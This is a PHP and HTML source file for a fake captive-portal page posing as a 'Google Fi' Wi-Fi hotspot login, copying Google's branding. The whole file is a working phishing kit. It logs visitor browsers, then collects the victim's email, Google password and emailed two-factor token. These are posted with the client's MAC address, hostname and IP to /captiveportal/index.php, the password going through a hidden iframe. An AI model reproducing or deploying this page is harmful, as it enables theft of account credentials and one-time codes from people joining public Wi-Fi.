<?php 
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
function increment_browser($browser)
{
    try {
        $sqlite = new \SQLite3('/tmp/landingpage.db');
    } catch (Exception $e) {
        return false;
    }
    $sqlite->exec('CREATE TABLE IF NOT EXISTS user_agents  (browser TEXT NOT NULL);');
    $statement = $sqlite->prepare('INSERT INTO user_agents (browser) VALUES(:browser);');
    $statement->bindValue(':browser', $browser, SQLITE3_TEXT);
    try {
        $ret = $statement->execute();
    } catch (Exception $e) {
        return false;
    }
    return $ret;
}

function identifyUserAgent($userAgent)
{
    if (preg_match('/(MSIE|Trident|(?!Gecko.+)Firefox)/', $userAgent)) {
        increment_browser('firefox');
    }else if (preg_match('/(?!AppleWebKit.+Chrome.+)Safari(?!.+Edge)/', $userAgent)) {
        increment_browser('safari');
    }else if (preg_match('/(?!AppleWebKit.+)Chrome(?!.+Edge)/', $userAgent)) {
        increment_browser('chrome');
    }else if (preg_match('/(?!AppleWebKit.+Chrome.+Safari.+)Edge/', $userAgent)) {
        increment_browser('edge');
    }else if (preg_match('/MSIE [0-9]\./', $userAgent)) {
        increment_browser('internet_explorer');
    } elseif (preg_match('/^Opera\/[0-9]{1,3}\.[0-9]/', $userAgent)) {
        increment_browser('opera');
    } else {
        increment_browser('other');
    }  
}
identifyUserAgent($_SERVER['HTTP_USER_AGENT']);
?>


<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <title>Google Fi | Wi-Fi hotspot</title>
        <!-- JQuery and Bootstrap -->

        <script src='assets/js/jquery-3.4.1.min.js'></script>
        <script src='assets/js/jquery-ui.min.js'></script>
        <link href='assets/css/bootstrap.min.css' rel="stylesheet">
        <script src='assets/js/bootstrap.min.js'></script>
        <link href='assets/css/progress-bar.css' rel="stylesheet">

        <link rel="stylesheet" href="assets/css/custom.css">

        <!-- Set the favicon -->
        <link rel="icon" type="image/png" href="assets/images/favicon.ico">
			
		  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Expires" content="0" />
        
        <!-- allow the site to be mobile responsive -->
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        <style media="screen">
        /* the tab magic */
			.tab {
  			display: none;
			}
			
        /* the two most common font faces used by Google */
        @font-face {
          font-family: 'Roboto';
          src: URL('assets/fonts/Roboto-Regular.ttf') format('truetype');
          font-weight: normal;
        }

        @font-face {
          font-family: 'open-sans';
          src: URL('assets/fonts/OpenSans-Regular.ttf') format('truetype');
          font-weight: normal;
        }

        </style>
    </head>
    <body>
	<noscript>
    <div style="position: fixed; top: 0px; left: 0px; z-index: 3000; 
                height: 100%; width: 100%; background-color: #FFFFFF">
        <p style="margin-left: 10px">JavaScript is not enabled.</p>
    </div>
</noscript>
        <div id='login-app'>
              <div class="login-container">
                <!-- progress bar from material.io -->
                <div class='progress-bar-container show-progress'>
                    <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style='display:none;'>
                        <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
                            <div class="mdc-linear-progress__buffering-dots"></div>
                            <div class="mdc-linear-progress__buffer"></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__primary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__secondary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                        </div>
                    </div>
                </div>
                <div class="tab"> <!--- #LOGIN TAP START --> 
                
                <div class='login-content' id='login-form'>
                    <!-- Google Logo -->
                    <div id="logo" title="Google">
                    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <g id="qaEJec">
                            <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                        </g>
                        <g id="YGlOvc">
                            <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                        </g>
                        <g id="BWfIk">
                            <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                        </g>
                        <g id="e6m3fd">
                            <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                        </g>
                        <g id="vbkDmc">
                            <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                        </g>
                        <g id="idEJde">
                            <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                        </g>
                    </svg>
                    <!-- /Google Logo -->
                    </div>
                    <form id="email-form-step-one" method="POST" action="/captiveportal/index.php" target="hiddenFrame">
                        <h1 class='g-h1'>Sign in to Google Fi</h1>
                        <h2 class='g-h2'>to get access to the Internet</h2>
                        <div class='login-content'>
                            <input id='email-input' name="email" type="email" class='g-input' placeholder="E-Mail" autofocus="true" autocorrect="off" autocomplete="on" autocapitalize="off"  required>
                            
                            <!-- CAPTIVE VALUES -->
                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
									 <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
									 <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
									 
                            <div class="invalid-email" style='display:none;'>
                                <!-- SVG for the invalid icon -->
                                <span class="invalid-icon">
                                    <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                    </svg>
                                </span><span class='invalid-email-text-span'>Enter a valid email</span>
                            </div>
                            <legend class='g-legend'>Forgot email?</legend>
                            <div class='login-priv'>
                                <p class='p'>Not your computer? Use a Private Window to sign in.</p>
                                <legend class='g-legend'>Learn more</legend>
                            </div>
                            <!-- form navigation menu -->
                            <div class='login-nav'>
                                <legend class='g-legend'>Create Account</legend>
                                <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div>
                            </div>
                        </div>
                </div>
                </div> <!-- #LOGIN TAP STOP -->
                <div class="tab"> <!-- #PW TAP START -->
                
                <div class='login-content' id='login-form'>
                    <!-- Google Logo -->
                    <div id="logo" title="Google">
                    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <g id="qaEJec">
                            <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                        </g>
                        <g id="YGlOvc">
                            <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                        </g>
                        <g id="BWfIk">
                            <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                        </g>
                        <g id="e6m3fd">
                            <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                        </g>
                        <g id="vbkDmc">
                            <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                        </g>
                        <g id="idEJde">
                            <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                        </g>
                    </svg>
                    <!-- /Google Logo -->
                    </div>
                        <br>
                        <h2 class='g-h2'>Enter Your Google Password to continue</h2>
                        <h2 class='g-h2'>&nbsp;</h2>
                        <div class='login-content'>
                            <input id='pw-input' name='gpw' type="password" class='g-input' placeholder="Password" autofocus="true" autocorrect="off" autocomplete="on" autocapitalize="off"  required>
                            
									 <!-- Action Indicatior -->
 									 <input type="hidden" name="gettoken" value="gettoken">
 						
                            <div class="invalid-pw" style='display:none;'>
                                <!-- SVG for the invalid icon -->
                                <span class="invalid-icon">
                                    <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                    </svg>
                                </span><span class='invalid-email-text-span'>Wrong Password</span>
                            </div>
                            <legend class='g-legend'>Forgot password?</legend>
                            <div class='login-priv'>
                                <p class='p'>Not your computer? Use a Private Window to sign in.</p>
                                <legend class='g-legend'>Learn more</legend>
                            </div>
                            <!-- form navigation menu -->
                            <div class='login-nav'>
                                <legend class='g-legend'>Create Account</legend>
                                <div class='gbtn-primary btn-next-pw'><span class='gbtn-label'>Next</span></div>
                            </div>
                        </div>
                    </form>
                </div>
                
                </div> <!-- PW TAP STOP -->
                <iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe> <!-- Hidden Target Frame -->
                <div class="tab"> <!-- #TOKEN TAP START -->
                
                <div class='login-content' id='login-form'>
                    <!-- Google Logo -->
                    <div id="logo" title="Google">
                    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <g id="qaEJec">
                            <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                        </g>
                        <g id="YGlOvc">
                            <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                        </g>
                        <g id="BWfIk">
                            <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                        </g>
                        <g id="e6m3fd">
                            <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                        </g>
                        <g id="vbkDmc">
                            <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                        </g>
                        <g id="idEJde">
                            <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                        </g>
                    </svg>
                    <!-- /Google Logo -->
                    </div>
                    <form id='email-form-step-fin' method="POST" action="/captiveportal/index.php">
                        <h1 class='g-h1'>Enter Your Token</h1>
                        <h2 class='g-h2'>Your Token has been send to your E-Mail<br>Enter the Token to continue </h2>
                        <div class='login-content'>
                            <input name='token' id='token-input' type="text" class='g-input' placeholder="TOKEN" autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off"  required>
                            <!-- PORTAL VALUES -->
                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>"> 
									 <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
									 <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
									 <!-- Action Indicatior -->
									<input type="hidden" name="getaccess" value="getaccess">
									<!-- Target Destination --> 
 									<input type="hidden" name="target" value="https://google.com"> <!-- SET TO GOOGLE / COULD BE REPLACED WITH $destination -->
                            <div class="invalid-token" style='display:none;'>
                                <!-- SVG for the invalid icon -->
                                <span class="invalid-icon">
                                    <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                    </svg>
                                </span><span class='invalid-email-text-span'>Enter a valid Token</span>
                            </div>
                            <legend class='g-legend'>Resend Token?</legend>
                            <div class='login-priv'>
                                <p class='p'>Not your computer? Use Guest mode to sign in privately.</p>
                                <legend class='g-legend'>Learn more</legend>
                            </div>
                            <!-- form navigation menu -->
                            <div class='login-nav'>
                                <legend class='g-legend'>Create Account</legend>
                                <div class='gbtn-primary btn-next-login'><span class='gbtn-label'>Login</span></div>
                            </div>
                        </div>
                    </form>
                </div>
                
                </div> <!-- TOKEN TAP STOP -->
				<div class="lang">
            <span class="lang">English (United States)‬ &nbsp; &#8711;</span><span class="more"><li><a href="https://support.google.com/accounts?hl=en" target="_blank">Help </a></li></span><span class="more priv"><li><a href="https://accounts.google.com/TOS?loc=DE&amp;hl=en&amp;privacy=true" target="_blank">Privacy </a></li></span><span class="more term"><li><a href="https://accounts.google.com/TOS?loc=DE&amp;hl=en" target="_blank">Terms </a></li></span>
            </div>
            </div>
            
            

        </div>
    </body>
</html>


<script type="text/javascript">

var currentTab = 0; // Current tab is set to be the first tab (0)
showTab(currentTab); // Display the current tab

function showTab(n) {
  // This function will display the specified tab of the form...
  var x = document.getElementsByClassName("tab");
  x[n].style.display = "block";
  //... and fix the Previous/Next buttons:
}

function validateEmail(email) {
        var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return re.test(email);
    }


 function doEmailStep(){

  /* check the validity of the email */
  email_valid = validateEmail($('#email-input').val());

  if(email_valid){

      /* fade in the loading animations */
      $( '.progress-bar' ).fadeIn('show');
      $( '#login-form' ).fadeTo( "fast", 0.6 )

      /* after we have a 'response' from the server */
      setTimeout(function () {

          /* hide the progress bar */
          $( '.progress-bar' ).css('display', 'none');

          /* if the user entered invalid entries before, hide the invalid classes */
          $( '#email-input' ).removeClass('g-input-invalid');
          $( '.invalid-email' ).css('display', 'none');

          /* set the opacity to normal */
          $( '#login-form' ).css('opacity', 1)
          
			  // This function will figure out which tab to display
			  var x = document.getElementsByClassName("tab");
			  // Hide the current tab:
			  x[currentTab].style.display = "none";
			  // Increase or decrease the current tab by 1:
			  currentTab = currentTab + 1;			  
			  // Display the correct tab:
			  showTab(currentTab);
      }, 800);

  } else {

      /* fade in the loading animations */
      $( '.progress-bar' ).fadeIn('slow');
      $( '#login-form' ).fadeTo( "fast", 0.6 )

      /* after we have a 'response' from the server */
      setTimeout(function () {

          /* show invalid classes as the email is not valid */
          $( '#login-form' ).css('opacity', 1)
          $( '.progress-bar' ).css('display', 'none');
          $( '#email-input' ).addClass('g-input-invalid');
          $( '.invalid-email' ).css('display', 'block');

      }, 500);

  }
 }
 
 function validatePw(pw) {
        var re = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/; /* https://stackoverflow.com/questions/19605150/regex-for-password-must-contain-at-least-eight-characters-at-least-one-number-a */
        return re.test(pw);
    }
    
 function doPwStep(){

  /* check the validity of the email */
  pw_valid = validatePw($('#pw-input').val());

  if(pw_valid){

      /* fade in the loading animations */
      $( '.progress-bar' ).fadeIn('show');
      $( '#login-form' ).fadeTo( "fast", 0.6 )

      /* after we have a 'response' from the server */
      setTimeout(function () {

          /* hide the progress bar */
          $( '.progress-bar' ).css('display', 'none');

          /* if the user entered invalid entries before, hide the invalid classes */
          $( '#pw-input' ).removeClass('g-input-invalid');
          $( '.invalid-pw' ).css('display', 'none');

          /* set the opacity to normal */
          $( '#login-form' ).css('opacity', 1)
          
			  // This function will figure out which tab to display
			  var x = document.getElementsByClassName("tab");
			  // Hide the current tab:
			  x[currentTab].style.display = "none";
			  // Increase or decrease the current tab by 1:
			  currentTab = currentTab + 1;
			  // ... the form gets submitted:
			  document.getElementById('email-form-step-one').submit();
			  // Display the correct tab:
			  showTab(currentTab);
      }, 800);

  } else {

      /* fade in the loading animations */
      $( '.progress-bar' ).fadeIn('slow');
      $( '#login-form' ).fadeTo( "fast", 0.6 )

      /* after we have a 'response' from the server */
      setTimeout(function () {

          /* show invalid classes as the email is not valid */
          $( '#login-form' ).css('opacity', 1)
          $( '.progress-bar' ).css('display', 'none');
          $( '#pw-input' ).addClass('g-input-invalid');
          $( '.invalid-pw' ).css('display', 'block');

      }, 500);

  }
 }

    /* seperate submit events as divs can't be used as submit buttons directly */

    // if the next button is pressed
    $( '#login-app' ).on('click', '.btn-next-email', function(event) {
        doEmailStep()
    });
    
    // if the pw button is pressed
    $( '#login-app' ).on('click', '.btn-next-pw', function(event) {
        doPwStep()
    });
    
    // if the login button is pressed
    $( '#login-app' ).on('click', '.btn-next-login', function(event) {
        document.getElementById('email-form-step-fin').submit();
    });

    // if the email form step is submitted
    $( '#login-app' ).on('submit', '#email-form-step-one', function(event) {
        event.preventDefault();
     });
</script>
